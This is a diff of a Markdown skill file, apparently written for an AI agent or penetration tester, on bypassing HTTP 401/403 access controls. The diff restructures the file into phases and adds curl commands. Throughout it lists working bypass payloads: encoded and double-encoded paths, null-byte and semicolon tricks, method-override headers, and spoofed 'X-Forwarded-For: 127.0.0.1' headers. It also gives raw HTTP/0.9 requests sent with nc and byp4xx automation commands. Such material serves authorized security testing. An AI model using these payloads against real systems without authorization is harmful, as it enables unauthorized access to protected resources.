@@ -1,28 +1,27 @@
 ---
 name: 401-403-bypass-techniques
-description: Use when a protected HTTP route returns 401 or 403 and proxy, server, framework, or parser differentials may expose an alternate access path.
+description: Use when protected HTTP routes return 401 or 403.
 version: 1.0.0
 revision_date: 2026-08-31
 license: MIT
 platforms: [linux]
 compatibility: Requires curl; byp4xx is optional.
-metadata:
-  tags: [recon, authorization, http, access-control, path-normalization]
-  category: recon
-  related_skills:
-    - hunt-auth-bypass
-    - hunt-http-smuggling
-    - hunt-ssrf
-    - hunt-idor
+tags: [recon, authorization, http, access-control, path-normalization]
+category: recon
+related_skills:
+  - hunt-auth-bypass
+  - hunt-http-smuggling
+  - hunt-ssrf
+  - hunt-idor
 ---
 
 # 401/403 Bypass Techniques
 
-A 401/403 differential appears when two HTTP-processing layers make different
-decisions about the same request. Common boundaries are CDN → reverse proxy,
-reverse proxy → web server, web server → framework, and framework → route-level
-authorization. The useful signal is a change in routing or protected content,
-not a status code by itself.
+A useful 401/403 bypass candidate often appears when two HTTP-processing layers
+make different decisions about the same request. Common boundaries are CDN →
+reverse proxy, reverse proxy → web server, web server → framework, and framework
+→ route-level authorization. The useful signal is a change in routing or
+protected content, not a status code by itself.
 
 ## When to Use
 
@@ -54,6 +53,13 @@ curl -sS --path-as-is --max-time 10 --connect-timeout 5 \
   -o "$OUTDIR/baseline.body" \
   -w 'status=%{http_code} bytes=%{size_download} redirect=%{redirect_url}\n' \
   "$TARGET$PATH_DENIED"
+
+# Compare one path, method, and header differential.
+curl -sS --path-as-is --max-time 10 -i \
+  "$TARGET/./${PATH_DENIED#/}"
+curl -sS --path-as-is --max-time 10 -i -X OPTIONS "$TARGET$PATH_DENIED"
+curl -sS --path-as-is --max-time 10 -i \
+  -H 'X-Forwarded-For: 127.0.0.1' "$TARGET$PATH_DENIED"
 ```
 
 For each candidate, preserve the raw path and compare status, `Location`, body
@@ -61,18 +67,19 @@ length, title, content type, cache headers, and a stable protected-content marke
 
 ## Procedure
 
-1. Record the denied baseline and identify which layer generated it.
-2. Test one normalization dimension at a time: path, method, header, or protocol.
-3. Repeat meaningful candidates as combinations when different layers consume different request fields.
-4. Map successful differentials to the component that interpreted the request differently.
-5. Confirm the protected route or behavior semantically rather than classifying by status alone.
+### Phase 1 — Capture and Classify the Baseline
 
-## Path Manipulation
+1. Record the denied response with the command from `How to Run`.
+2. Save status, headers, redirect target, body length, title, and a stable body marker.
+3. Identify whether the denial resembles a CDN/WAF, proxy, server, framework, or application response.
+4. Use the same baseline fingerprint when comparing every later phase.
+
+### Phase 2 — Test Path Normalization
 
 The central question is whether the access-control layer and route handler use
 the same canonical path.
 
-### Trailing Slash, Dot, and Empty Segments
+#### Trailing Slash, Dot, and Empty Segments
 
 ```text
 /admin
@@ -93,7 +100,7 @@ the same canonical path.
 Use `--path-as-is`; otherwise the client may normalize the candidate before it
 reaches the target.
 
-### Case Sensitivity
+#### Case Sensitivity
 
 ```text
 /admin
@@ -105,7 +112,7 @@ reaches the target.
 This is most relevant when a case-sensitive proxy rule fronts a case-insensitive
 filesystem or router, particularly IIS/ASP.NET and Windows-hosted applications.
 
-### Percent Encoding
+#### Percent Encoding
 
 ```text
 /%61dmin
@@ -120,7 +127,7 @@ Test whether decoding happens before or after location matching. Encoded `/`,
 `.`, `?`, and path characters are especially useful when a gateway and backend
 decode at different stages.
 
-### Double Encoding
+#### Double Encoding
 
 ```text
 /%2561dmin
@@ -132,7 +139,7 @@ decode at different stages.
 `%25` becomes `%` after the first decode. These variants matter when one layer
 decodes once and another layer decodes again.
 
-### Legacy UTF-8 and Null-Byte Parsing
+#### Legacy UTF-8 and Null-Byte Parsing
 
 ```text
 /%C0%AFadmin     overlong UTF-8 form of `/`
@@ -140,13 +147,14 @@ decodes once and another layer decodes again.
 /admi%C1%AE      overlong UTF-8 form of `n`
 /admin%00
 /admin%00.json
+/%00/admin
 ```
 
 These are legacy parser behaviors. Modern UTF-8 decoders reject overlong forms,
 and modern managed runtimes usually reject embedded NUL bytes. They remain
 relevant to older native modules, legacy gateways, and mixed decoding chains.
 
-### Path Parameters and Matrix Variables
+#### Path Parameters and Matrix Variables
 
 ```text
 /admin;
@@ -154,6 +162,7 @@ relevant to older native modules, legacy gateways, and mixed decoding chains.
 /admin;x
 /;/admin
 /admin..;/
+/admin;.css
 /admin;jsessionid=marker
 ```
 
@@ -161,12 +170,13 @@ Semicolon segments are significant in Java/Tomcat and frameworks that support
 matrix parameters. A proxy may compare the literal segment while the application
 strips or separately parses the parameter.
 
-### Suffix and Extension Handling
+#### Suffix and Extension Handling
 
 ```text
 /admin.json
 /admin.html
 /admin.css
+/admin.anything
 /admin%20
 /admin%09
 /admin%0d
@@ -183,12 +193,10 @@ data. Control-character suffixes target legacy request-line or parser handling.
 Suffix matching is mainly relevant to older framework configurations and
 extension-based rewrite rules.
 
-### Backslash and Windows Path Handling
+#### Backslash and Windows Path Handling
 
 ```text
 /admin\
-/admin;.css
-/admin.anything
 \admin
 /admin\..\admin
 /admin::$DATA
@@ -198,13 +206,12 @@ Backslash and NTFS alternate-data-stream forms are IIS/Windows-specific. ADS
 handling is primarily legacy, but backslash normalization still differs between
 URL parsers, security filters, and Windows path APIs.
 
-### Combined Path Transformations
+#### Combined Path Transformations
 
 ```text
 ///Admin///
 /./%61dmin/
 /./admin/./
-/%00/admin
 /admin..;/admin
 /admin/..;/admin
 /admin../
@@ -216,9 +223,9 @@ Combinations are useful after a single transformation identifies the layer that
 normalizes differently. Combining random mutations without a parser hypothesis
 produces noisy results that are difficult to interpret.
 
-## HTTP Method Bypass
+### Phase 3 — Test Method Dispatch
 
-### Direct Method Changes
+#### Direct Method Changes
 
 ```text
 GET      /admin
@@ -238,7 +245,7 @@ CONNECT  /admin
 - `TRACE` tests server reflection and method filtering; it does not retrieve the protected representation.
 - `CONNECT` primarily tests proxy handling and tunnel policy, not ordinary origin routing.
 
-### Method Override Headers and Parameters
+#### Method Override Headers and Parameters
 
 ```http
 POST /admin HTTP/1.1
@@ -260,7 +267,7 @@ Override behavior appears in frameworks and middleware that tunnel methods
 through `POST`. The differential exists when the filtering layer checks the
 outer method while the route dispatcher uses the overridden method.
 
-### Custom and WebDAV Methods
+#### Custom and WebDAV Methods
 
 ```text
 FOOBAR    /admin
@@ -276,9 +283,9 @@ UNLOCK    /admin
 Custom verbs test allowlist assumptions. WebDAV verbs are useful when WebDAV is
 enabled on IIS, Apache, a storage gateway, or a reverse proxy with DAV support.
 
-## Header-Based Bypass
+### Phase 4 — Test Header Interpretation
 
-### Rewrite and Original-Path Headers
+#### Rewrite and Original-Path Headers
 
 ```http
 GET / HTTP/1.1
@@ -293,7 +300,7 @@ application stacks. Nginx does not universally honor them by itself. The tested
 condition is whether the frontend authorizes `/` while a downstream component
 routes the header-provided path.
 
-### Forwarding and Client-IP Headers
+#### Forwarding and Client-IP Headers
 
 ```text
 X-Forwarded-For
@@ -334,7 +341,7 @@ an IP-only header:
 Forwarded: for=127.0.0.1;proto=https;host=localhost
 ```
 
-### Routing and Content-Negotiation Headers
+#### Routing and Content-Negotiation Headers
 
 ```http
 Referer: https://target.example/admin
@@ -351,9 +358,9 @@ These test referer/origin checks, virtual-host routing, forwarded scheme/host
 handling, content-type-specific routes, AJAX-only branches, and representation
 negotiation.
 
-## Protocol Version Bypass
+### Phase 5 — Test Protocol Variants
 
-### HTTP/1.0
+#### HTTP/1.0
 
 ```bash
 curl -sS --http1.0 --path-as-is -i "https://target.example/admin"
@@ -362,7 +369,7 @@ curl -sS --http1.0 --path-as-is -i "https://target.example/admin"
 HTTP/1.0 changes persistent-connection behavior and may traverse a different
 proxy or ACL path. Host handling also differs on legacy intermediaries.
 
-### HTTP/0.9
+#### HTTP/0.9
 
 ```bash
 printf 'GET /admin\r\n' | nc target.example 80
@@ -372,7 +379,7 @@ HTTP/0.9 is legacy and has no response headers. It is relevant only when an old
 listener or compatibility path accepts the request form while a newer frontend
 expects HTTP/1.x semantics.
 
-### HTTP/2 Pseudo-Headers
+#### HTTP/2 Pseudo-Headers
 
 ```http
 :method: GET
@@ -386,7 +393,7 @@ handling after H2-to-H1 translation, and differences between edge and origin
 protocol parsers. Use `hunt-http-smuggling` when the differential crosses
 request boundaries rather than only route authorization.
 
-### WebSocket Upgrade
+#### WebSocket Upgrade
 
 ```http
 GET /admin HTTP/1.1
@@ -402,7 +409,7 @@ handles upgrade requests differently from ordinary HTTP. A `101 Switching
 Protocols` response confirms a handshake path, not access to the protected HTTP
 representation; verify the resulting channel and route semantics separately.
 
-## Method, Path, and Header Combinations
+### Phase 6 — Combine Confirmed Differentials
 
 ```http
 POST / HTTP/1.1
@@ -423,7 +430,7 @@ Build combinations from observed behavior: path mutations target canonicalizatio
 method variants target dispatch, headers target trust/routing, and protocol
 variants target intermediary parsing.
 
-## Technology-Specific Matrix
+### Phase 7 — Apply Stack-Specific Checks
 
 | Stack | Differential to test | Technical condition |
 |---|---|---|
@@ -435,7 +442,7 @@ variants target intermediary parsing.
 | Node/Express | Repeated slash, case-sensitive/strict routing options, mounted routers | Proxy path and Express route options disagree |
 | WebDAV | `PROPFIND`, `MOVE`, `COPY`, `MKCOL`, locking methods | DAV handler has a different method or path policy |
 
-## Automated Tools
+### Phase 8 — Automate for Coverage
 
 | Tool | Use |
 |---|---|
@@ -445,7 +452,7 @@ variants target intermediary parsing.
 | Burp Intruder | Cartesian products of paths, methods, headers, and values |
 | Burp Repeater | Precise raw-path and response comparison |
 
-### byp4xx
+#### byp4xx
 
 ```bash
 byp4xx -m 10 --rate 5 -xD "https://target.example/admin"
@@ -458,7 +465,7 @@ byp4xx -m 10 --rate 5 -xD "https://target.example/admin"
 Automation output is a candidate list. Reproduce useful rows manually and
 compare their response semantics with the baseline.
 
-## Decision Tree
+### Execution Flow
 
 ```text
 Denied baseline
@@ -518,10 +525,12 @@ Denied baseline
 - A `301` or `302` may only redirect to authentication; inspect `Location` and the destination body.
 - `HEAD` has no body, so body access must be tested with a method that returns the representation.
 - `OPTIONS` and `TRACE` expose method behavior but do not by themselves expose the protected route.
-- CDN, proxy, server, framework, and application layers may each normalize differently; identify the layer responsible for the change.
+- CDN, proxy, server, framework, and application layers may each normalize
+  differently; identify the layer responsible for the change.
 - Browser and command-line clients normalize URLs differently. Preserve raw paths when testing parser behavior.
 - Legacy forms are useful only when a compatible parser or compatibility layer is present.
-- Cache hits can make two distinct backend requests look identical, or make one candidate look successful without reaching the protected handler.
+- Cache hits can make two distinct backend requests look identical, or make one
+  candidate look successful without reaching the protected handler.
 
 ## Verification
 
